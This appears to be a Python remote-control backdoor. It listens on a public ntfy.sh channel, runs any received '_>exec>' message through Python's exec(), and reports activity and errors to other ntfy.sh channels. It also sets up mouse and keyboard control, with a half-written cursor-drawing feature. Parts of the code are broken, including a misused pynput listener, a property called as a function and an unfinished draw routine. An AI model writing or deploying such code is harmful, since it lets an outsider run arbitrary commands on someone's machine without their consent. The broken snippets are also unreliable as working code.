from threading import Thread
from time import sleep
import requests as req
import datetime as dt
import os
import pyautogui as pgui
from psutil import pid_exists
import math
import json
from pynput.mouse import Button as Button, Controller as MController
from pynput.keyboard import Key as Key, Controller as KController

global mouse
mouse = MController()
global keyboard
keyboard = KController()

def on_move(x,y): pass
def on_click(x,y,button,pressed): pass
mlistener = mouse.listener(on_move=on_move, on_click=on_click)
def on_press(key): pass
def on_release(key): pass
klistener = keyboard.listener(on_press=on_press, on_release=on_release)


global priorities
priorities = {
    'error': 1,
    'info': 1,
    'merror':3,
    'exec':2,
    'draw':2

}
global screenSize
screenSize = pgui.size()

global patterns
patterns = {

}
def draw(pattern, x=screenSize[0]/2, y=screenSize[1]/2, s=1):
    try:
        cx, cy = mouse.position()
        x=float(x)
        y=float(y)
        if x==-1: x=cx
        elif x==-2: x=screenSize[0]/2
        if y==-1: y=cy
        elif y==-2: y=screenSize[1]/2
        x=max(200,x)
        y=max(200,y)



    except KeyboardInterrupt: raise KeyboardInterrupt
    except Exception as e:
        send(f'Exception: {e} @draw', 'error', priorities['error'])


def threadrun(func, daemon=True):
    th=Thread(target=func, daemon=daemon).start()
    send(f'Started thread {func.__name__}', '', priorities['info'])

def gettime():
    return dt.datetime.now().strftime("%d/%m/%Y %H:%M:%S")

def send(msg, title='', priority=1, channel='https://ntfy.sh/amogoos-OUT'):
    try:
        req.post(channel,
                      data=f'{msg}',
                      headers={
                          "Title": f'{title}',
                          "Priority": f'{priority}',
                      })
    except UnicodeEncodeError: send('Text contains cyrillic', 'Error sending a msg', priorities['error'])

def ntfylisten(channel='https://ntfy.sh/amogoos-IN'):
    resp = req.get(channel+'/json', stream=True)
    for line in resp.iter_lines():
        if line:
            msghandle(json.loads(line))

def dexec(cmd):
    try:
        send(f'Executing {cmd}', 'Exec', priorities['exec'])
        exec(cmd)
    except KeyboardInterrupt: raise KeyboardInterrupt
    except Exception as e:
        send(f'Error during exec {e}', 'ExecError', priorities['error'])

def msghandle(msg):
    try:
        if msg['event'] == 'message':
            print(msg)
            send(f"Received '{msg['message']}'", 'test', priorities['info'], 'https://ntfy.sh/amogoos-UPDOWN')
            msg = msg['message']
            print(msg)
            if msg[0] == '_':
                msg = msg.split('>')
                if msg[1] == 'exec':
                    cmd = ''.join(msg[2:])
                    dexec(cmd)
                if msg[1] == 'draw':
                    drw = ''.join(msg[2:])
                    if '/' in drw:
                        x,y,s = drw.split('/')[1:]
                    pat = drw.split('/')[0]
                    print(f'{pat=}, {x=}:{y=}({s=})')
                    draw(pat,x,y,s)
    except KeyboardInterrupt: raise KeyboardInterrupt
    except Exception as e: send(f'Exception: {e} @msghandle', 'error', priorities['error'])


threadrun(ntfylisten, False)

print('Good luck, amogoos')
while True: pass